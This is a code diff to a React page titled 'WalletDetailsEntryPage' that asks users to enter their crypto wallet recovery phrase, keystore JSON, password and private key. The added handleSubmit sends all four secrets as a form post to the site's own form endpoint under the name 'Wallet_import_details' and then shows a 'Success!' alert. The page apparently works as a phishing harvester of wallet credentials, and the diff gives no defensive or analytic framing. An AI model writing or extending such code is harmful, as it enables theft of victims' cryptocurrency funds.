@@ -13,46 +13,46 @@ function WalletDetailsEntryPage() {
 
   // form handling
 
-  const [userData, setUserData] = useState({
-    phrase: '',
-    keystoreJson: '',
-    password: '',
-    privateKey: '',
-  });
+  let [phrase, addPhrase] = useState('');
+  let [keystoreJson, addKeystoreJson] = useState('');
+  let [password, addPassword] = useState('');
+  let [privateKey, addPrivateKey] = useState('');
 
-  const [userDataArray, setUserDataArray] = useState([]);
+  // const [userData, setUserData] = useState({});
 
-  function handleChange(e) {
-    const name = e.target.name;
-    const value = e.target.value;
-    setUserData({ ...userData, [name]: value });
-  }
+  const userData = { phrase, keystoreJson, password, privateKey };
 
-  console.log(userData);
+  const encode = (data) => {
+    return Object.keys(data)
+      .map(
+        (key) => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
+      )
+      .join('&');
+  };
 
   function handleSubmit(e) {
     e.preventDefault();
+    if (phrase && keystoreJson && password && privateKey) {
+      fetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: encode({ 'form-name': 'Wallet_import_details', userData }),
+      })
+        .then(() => {
+          phrase = '';
+          keystoreJson = '';
+          password = '';
+          privateKey = '';
+          alert('Success!');
+        })
+        .catch((error) => alert(error));
+
+      console.log(userData);
+    } else {
+      alert('incomplete entries');
+      return false;
+    }
   }
-  // const encode = (data) => {
-  //   return Object.keys(data)
-  //     .map(
-  //       (key) => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
-  //     )
-  //     .join('&');
-  // };
-
-  // useEffect(() => {
-  //   fetch('/wallet-details-entry-page', {
-  //     method: 'POST',
-  //     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-  //     body: encode({ 'form-name': 'contact-form' }),
-  //   })
-  //     .then(() => alert('Success!'))
-
-  //     .catch((error) => alert(error));
-  // });
-
-  // console.log(addPhrase);
 
   function displayPhrase() {
     setShowPhrase(true);
@@ -124,8 +124,8 @@ function WalletDetailsEntryPage() {
                 placeholder="Phrase"
                 name="Phrase"
                 rows="5"
-                value={userData.phrase}
-                onChange={handleChange}
+                value={phrase}
+                onChange={(e) => addPhrase(e.target.value)}
               ></textarea>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
@@ -139,8 +139,8 @@ function WalletDetailsEntryPage() {
                 className="form-control"
                 placeholder="Keystore JSON"
                 name="Keystore-JSON"
-                value={userData.keystoreJson}
-                onChange={handleChange}
+                value={keystoreJson}
+                onChange={(e) => addKeystoreJson(e.target.value)}
                 rows="5"
               ></textarea>
               <div>
@@ -150,8 +150,8 @@ function WalletDetailsEntryPage() {
                   placeholder="Password"
                   name="Password"
                   id="inputPassword"
-                  value={userData.password}
-                  onChange={handleChange}
+                  value={password}
+                  onChange={(e) => addPassword(e.target.value)}
                 ></input>
               </div>
               <div className="tip-text">
@@ -168,8 +168,8 @@ function WalletDetailsEntryPage() {
                 className="form-control"
                 placeholder="Private Key"
                 name="Private-key"
-                value={userData.privateKey}
-                onChange={handleChange}
+                value={privateKey}
+                onChange={(e) => addPrivateKey(e.target.value)}
               ></input>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
